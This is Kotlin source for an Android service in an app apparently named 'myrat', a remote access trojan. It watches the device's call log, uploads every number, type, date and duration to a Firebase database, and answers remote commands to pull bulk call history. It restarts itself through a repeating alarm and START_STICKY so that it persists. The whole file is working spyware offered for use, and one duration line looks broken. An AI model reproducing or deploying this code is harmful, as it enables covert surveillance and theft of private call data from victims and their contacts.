package com.myrat.app.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.database.ContentObserver
import android.database.Cursor
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.provider.CallLog
import androidx.core.app.NotificationCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*

class CallLogUploadService : Service() {

    private val db = FirebaseDatabase.getInstance().reference
    private lateinit var deviceId: String
    private lateinit var sharedPref: SharedPreferences
    private var callLogObserver: ContentObserver? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onCreate() {
        super.onCreate()
        startForegroundService()
        deviceId = MainActivity.getDeviceId(this)
        sharedPref = getSharedPreferences("call_log_pref", Context.MODE_PRIVATE)
        Logger.log("CallLogUploadService started for deviceId: $deviceId")

        scheduleRestart(this)
        // Initialize real-time call log monitoring
        setupCallLogObserver()
        // Check for initial upload command
        listenForUploadCommand()
    }

    private fun scheduleRestart(context: Context) {
        val alarmIntent = Intent(context, CallLogUploadService::class.java)
        val pendingIntent = PendingIntent.getService(
            context, 0, alarmIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )


        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.setRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 60_000, // delay before restart
            5 * 60_000, // repeat every 5 minutes
            pendingIntent
        )
    }

    private fun startForegroundService() {
        val channelId = "CallLogUploader"
        val channelName = "Call Log Upload Service"

        val manager = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW)
            channel.setShowBadge(false)
            manager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Syncing Call Logs")
            .setContentText("Monitoring and uploading call history")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        startForeground(10, notification)
    }

    private fun setupCallLogObserver() {
        callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                Logger.log("Call log change detected")
                uploadNewCallLogs()
            }
        }

        contentResolver.registerContentObserver(
            CallLog.Calls.CONTENT_URI,
            true,
            callLogObserver!!
        )
        Logger.log("Call log observer registered")
    }

    private fun listenForUploadCommand() {
        val callsRef = db.child("Device").child(deviceId).child("calls")

        callsRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val shouldUpload = snapshot.child("getCallLog").getValue(Boolean::class.java) ?: false
                val howMany = snapshot.child("HowManyNumToUpload").getValue(Int::class.java) ?: 0
                val dateFrom = snapshot.child("DateFrom").getValue(Long::class.java) ?: 0L

                if (shouldUpload) {
                    when {
                        dateFrom > 0 -> {
                            Logger.log("Command received: Upload call logs since $dateFrom")
                            uploadCallsFromDate(dateFrom)
                        }
                        howMany > 0 -> {
                            Logger.log("Command received: Upload last $howMany call logs")
                            uploadRecentCallsByCount(howMany)
                        }
                        else -> {
                            Logger.log("Invalid command parameters: dateFrom=$dateFrom, limit=$howMany")
                        }
                    }
                    // Reset the trigger
                    callsRef.child("getCallLog").setValue(false)
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Logger.log("Failed to read upload command: ${error.message}")
            }
        })
    }

    private fun uploadNewCallLogs() {
        val lastTimestamp = sharedPref.getLong("last_call_timestamp", 0L)
        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            ),
            "${CallLog.Calls.DATE} > ?",
            arrayOf(lastTimestamp.toString()),
            "${CallLog.Calls.DATE} ASC"
        )

        val callList = mutableListOf<Map<String, Any>>()
        var latestDate = lastTimestamp

        cursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val type = when (it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))) {
                    CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                    CallLog.Calls.INCOMING_TYPE -> "Incoming"
                    CallLog.Calls.MISSED_TYPE -> "Missed"
                    CallLog.Calls.REJECTED_TYPE -> "Rejected"
                    CallLog.Calls.VOICEMAIL_TYPE -> "Voicemail"
                    else -> "Unknown"
                }
                val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                val duration = it.getLong(it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    .toInt())

                callList.add(
                    mapOf(
                        "number" to number,
                        "type" to type,
                        "date" to date,
                        "duration" to duration,
                        "uploaded" to System.currentTimeMillis()
                    )
                )

                if (date > latestDate) latestDate = date
            }
        }

        if (callList.isNotEmpty()) {
            Logger.log("Found ${callList.size} new call logs since $lastTimestamp")
            uploadInBatches(callList, latestDate)
        } else {
            Logger.log("No new call logs since $lastTimestamp")
        }
    }

    private fun uploadCallsFromDate(dateFrom: Long) {
        val maxLimit = 500
        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            ),
            "${CallLog.Calls.DATE} > ?",
            arrayOf(dateFrom.toString()),
            "${CallLog.Calls.DATE} DESC"
        )

        val callList = mutableListOf<Map<String, Any>>()
        var latestDate = dateFrom

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < maxLimit) {
                val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val type = when (it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))) {
                    CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                    CallLog.Calls.INCOMING_TYPE -> "Incoming"
                    CallLog.Calls.MISSED_TYPE -> "Missed"
                    CallLog.Calls.REJECTED_TYPE -> "Rejected"
                    CallLog.Calls.VOICEMAIL_TYPE -> "Voicemail"
                    else -> "Unknown"
                }
                val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))

                callList.add(
                    mapOf(
                        "number" to number,
                        "type" to type,
                        "date" to date,
                        "duration" to duration,
                        "uploaded" to System.currentTimeMillis()
                    )
                )

                if (date > latestDate) latestDate = date
                count++
            }
        }

        if (callList.isNotEmpty()) {
            Logger.log("Found ${callList.size} calls since $dateFrom")
            uploadInBatches(callList.reversed(), latestDate)
        } else {
            Logger.log("No call logs found since $dateFrom")
        }
    }

    private fun uploadRecentCallsByCount(limit: Int) {
        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            ),
            null,
            null,
            "${CallLog.Calls.DATE} DESC"
        )

        val callList = mutableListOf<Map<String, Any>>()
        var latestDate = 0L

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < limit) {
                val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val type = when (it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))) {
                    CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                    CallLog.Calls.INCOMING_TYPE -> "Incoming"
                    CallLog.Calls.MISSED_TYPE -> "Missed"
                    CallLog.Calls.REJECTED_TYPE -> "Rejected"
                    CallLog.Calls.VOICEMAIL_TYPE -> "Voicemail"
                    else -> "Unknown"
                }
                val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))

                callList.add(
                    mapOf(
                        "number" to number,
                        "type" to type,
                        "date" to date,
                        "duration" to duration,
                        "uploaded" to System.currentTimeMillis()
                    )
                )

                if (date > latestDate) latestDate = date
                count++
            }
        }

        if (callList.isNotEmpty()) {
            Logger.log("Fetched last ${callList.size} call logs")
            uploadInBatches(callList.reversed(), latestDate)
        } else {
            Logger.log("No call logs found")
        }
    }

    private fun uploadInBatches(
        calls: List<Map<String, Any>>,
        latestDate: Long,
        batchSize: Int = 25,
        delayBetweenBatches: Long = 300L
    ) {
        scope.launch {
            val callsRef = db.child("Device").child(deviceId).child("calls/data")

            calls.chunked(batchSize).forEachIndexed { index, batch ->
                Logger.log("Uploading batch ${index + 1}/${(calls.size + batchSize - 1) / batchSize}")

                val tasks = batch.map {
                    async {
                        callsRef.push().setValue(it).addOnFailureListener { e ->
                            Logger.log("Upload failed: ${e.message}")
                        }
                    }
                }

                tasks.awaitAll()
                delay(delayBetweenBatches)
            }

            sharedPref.edit().putLong("last_call_timestamp", latestDate).apply()
            Logger.log("Upload complete. Latest timestamp saved: $latestDate")

            db.child("Device").child(deviceId).child("calls").child("lastUploadCompleted")
                .setValue(System.currentTimeMillis())
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Ensures service restarts if killed
    }

    override fun onDestroy() {
        super.onDestroy()
        callLogObserver?.let {
            contentResolver.unregisterContentObserver(it)
            Logger.log("Call log observer unregistered")
        }
        scope.cancel()
        Logger.log("CallLogUploadService destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}